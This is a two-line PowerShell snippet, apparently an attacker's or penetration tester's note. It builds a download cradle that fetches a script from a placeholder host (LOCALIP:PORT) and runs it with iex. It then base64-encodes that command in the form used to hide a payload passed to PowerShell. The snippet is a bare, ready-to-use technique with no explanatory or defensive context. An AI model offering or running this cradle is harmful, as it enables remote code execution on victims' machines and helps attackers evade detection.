$str= “iex (new-object system.net.webclient).downloadstring(‘http://LOCALIP:PORT/readme.md')"

[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
